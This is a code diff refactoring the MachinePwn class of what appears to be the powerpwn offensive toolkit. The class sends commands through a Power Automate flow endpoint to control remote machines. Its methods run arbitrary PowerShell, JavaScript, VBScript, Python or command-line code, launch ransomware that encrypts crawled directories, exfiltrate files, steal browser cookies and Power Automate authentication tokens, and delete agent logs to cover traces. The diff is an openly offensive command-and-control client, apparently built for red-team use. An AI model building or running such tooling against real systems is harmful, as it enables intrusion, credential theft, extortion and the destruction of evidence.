@@ -4,8 +4,20 @@ from typing import List
 import requests
 from pydantic.error_wrappers import ValidationError
 
-from powerpwn.machinepwn.models.cmd_arguments import CodeExecTypeEnum, CommandArguments, CommandToRunEnum
+from powerpwn.machinepwn.enums.code_exec_type_enum import CodeExecTypeEnum
+from powerpwn.machinepwn.models.any_command_args import AnyCommandArgs
+from powerpwn.machinepwn.models.cleanup_command_args import CleanupCommandArgs
 from powerpwn.machinepwn.models.cmd_results import CommandResults
+from powerpwn.machinepwn.models.code_exec_args_properties import CodeExecArgsProperties
+from powerpwn.machinepwn.models.code_exec_command_args import CodeExecCommandArgs
+from powerpwn.machinepwn.models.command_args_properties_base_model import CommandArgsPropertiesBaseModel
+from powerpwn.machinepwn.models.exflirtate_file_args_properties import ExflirtateFileArgsProperties
+from powerpwn.machinepwn.models.exflirtate_file_command_args import ExflirtateFileCommandArgs
+from powerpwn.machinepwn.models.ransomware_args_properties import RansomwareArgsProperties
+from powerpwn.machinepwn.models.ransomware_command_args import RansomwareCommandArgs
+from powerpwn.machinepwn.models.steal_cookie_args_properties import StealCookieArgsProperties
+from powerpwn.machinepwn.models.steal_cookie_command_args import StealCookieCommandArgs
+from powerpwn.machinepwn.models.steal_power_automate_token_command_args import StealPowerAutomateTokenCommandArgs
 
 
 class MachinePwn:
@@ -18,19 +30,22 @@ class MachinePwn:
         self.post_url = post_url
         self.debug = debug
 
-    def run_cmd(self, arguments: CommandArguments) -> CommandResults:
+    def run_cmd(self, arguments: AnyCommandArgs) -> CommandResults:
         if self.debug:
-            print(f"Raw command: {arguments}")
+            print(f"Raw command: {arguments.__root__}")
 
         try:
-            cmd_args = json.loads(arguments.json())
+            cmd_args = json.loads(arguments.__root__.json())
         except json.JSONDecodeError:
             print(f"Bad command. Raw content: {arguments}")
             raise
 
         results = self._run_cmd(arguments_as_dict=cmd_args)
-
-        cmd_res = CommandResults.parse_obj(results)
+        
+        if "error" in results:
+            cmd_res=CommandResults(is_success=False, error_message=results["error"]["message"])
+        else:
+            cmd_res = CommandResults.parse_obj(results)
         return cmd_res
 
     def _run_cmd(self, arguments_as_dict: dict) -> dict:  # type: ignore
@@ -46,59 +61,9 @@ class MachinePwn:
             print(f"Bad response. Raw content: {resp.content.decode('utf8')}")
             raise
 
-    def exec_py2(self, command: str) -> CommandResults:
-        """
-        Execute command in a Python2 interpreter
-        :param command: a Python2 script encoded as a string
-        :return: command results
-        """
-        flow_args = CommandArguments(
-            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.PYTHON, code_exec_command=command
-        )
-        return self.run_cmd(flow_args)
-
-    def exec_vb(self, command: str) -> CommandResults:
-        """
-        Execute command in a Visual Basic interpreter
-        :param command: a Visual Basic script encoded as a string
-        :return: command results
-        """
-        flow_args = CommandArguments(
-            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.VISUALBASIC, code_exec_command=command
-        )
-        return self.run_cmd(flow_args)
-
-    def exec_js(self, command: str) -> CommandResults:
-        """
-        Execute command in a JavaScript interpreter
-        :param command: a JavaScript script encoded as a string
-        :return: command results
-        """
-        flow_args = CommandArguments(
-            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.JAVASCRIPT, code_exec_command=command
-        )
-        return self.run_cmd(flow_args)
-
-    def exec_ps(self, command: str) -> CommandResults:
-        """
-        Execute command in a PowerShell interpreter
-        :param command: a PowerShell script encoded as a string
-        :return: command results
-        """
-        flow_args = CommandArguments(
-            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.POWERSHELL, code_exec_command=command
-        )
-        return self.run_cmd(flow_args)
-
-    def exec_cmd(self, command: str) -> CommandResults:
-        """
-        Execute command in a CommandLine
-        :param command: a CommandLine script encoded as a string
-        :return: command results
-        """
-        flow_args = CommandArguments(
-            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.COMMANDLINE, code_exec_command=command
-        )
+    def exec_command(self, command: str, command_type: CodeExecTypeEnum) -> CommandResults:
+        props = CodeExecArgsProperties(code_exec_command_type=command_type, code_exec_command=command)
+        flow_args = AnyCommandArgs.parse_obj(CodeExecCommandArgs(command_properties=props))  # type: ignore[arg-type]
         return self.run_cmd(flow_args)
 
     def ransomware(self, crawl_depth: str, dirs_to_init_crawl: List[str], encryption_key: str) -> CommandResults:
@@ -110,12 +75,10 @@ class MachinePwn:
         :return: command results
         """
         dirs_to_init_crawl_str = ",".join(dirs_to_init_crawl)
-        flow_args = CommandArguments(
-            command_to_run=CommandToRunEnum.RANSOMWARE,
-            ransomware_crawl_depth=crawl_depth,
-            ransomware_directories_to_init_crawl=dirs_to_init_crawl_str,
-            ransomware_encryption_key=encryption_key,
+        props = RansomwareArgsProperties(
+            ransomware_crawl_depth=crawl_depth, ransomware_directories_to_init_crawl=dirs_to_init_crawl_str, ransomware_encryption_key=encryption_key
         )
+        flow_args = AnyCommandArgs.parse_obj(RansomwareCommandArgs(command_properties=props))  # type: ignore[arg-type] # known bug: https://github.com/python/mypy/issues/13421
         return self.run_cmd(flow_args)
 
     def exfiltrate(self, target_file_path: str) -> CommandResults:
@@ -124,7 +87,8 @@ class MachinePwn:
         :param target_file_path: absolute path to file
         :return: command results
         """
-        flow_args = CommandArguments(command_to_run=CommandToRunEnum.EXFILTRATION, exfiltrate_target_file=target_file_path)
+        props = ExflirtateFileArgsProperties(exfiltrate_target_file=target_file_path)
+        flow_args = AnyCommandArgs.parse_obj(ExflirtateFileCommandArgs(command_properties=props))  # type: ignore[arg-type]
         return self.run_cmd(flow_args)
 
     def cleanup(self) -> CommandResults:
@@ -132,7 +96,8 @@ class MachinePwn:
         Delete agent log files
         :return: command results
         """
-        flow_args = CommandArguments(command_to_run=CommandToRunEnum.CLEANUP)
+
+        flow_args = AnyCommandArgs.parse_obj(CleanupCommandArgs(command_properties=CommandArgsPropertiesBaseModel()))  # type: ignore[arg-type]
         return self.run_cmd(flow_args)
 
     def steal_power_automate_token(self) -> CommandResults:
@@ -140,7 +105,7 @@ class MachinePwn:
         Open a browser, go to the Power Automate website and steal the authentication token
         :return: command results
         """
-        flow_args = CommandArguments(command_to_run=CommandToRunEnum.STEAL_POWER_AUTOMATE_TOKEN)
+        flow_args = AnyCommandArgs.parse_obj(StealPowerAutomateTokenCommandArgs(command_properties=CommandArgsPropertiesBaseModel()))  # type: ignore[arg-type]
         return self.run_cmd(flow_args)
 
     def steal_cookie(self, fqdn: str) -> CommandResults:
@@ -149,5 +114,6 @@ class MachinePwn:
         :param fqdn: fully qualified domain name to fetch the cookies of
         :return: command results
         """
-        flow_args = CommandArguments(command_to_run=CommandToRunEnum.STEAL_COOKIE, steal_cookie_fqdn=fqdn)
+        props = StealCookieArgsProperties(steal_cookie_fqdn=fqdn)
+        flow_args = AnyCommandArgs.parse_obj(StealCookieCommandArgs(command_properties=props))  # type: ignore[arg-type]
         return self.run_cmd(flow_args)
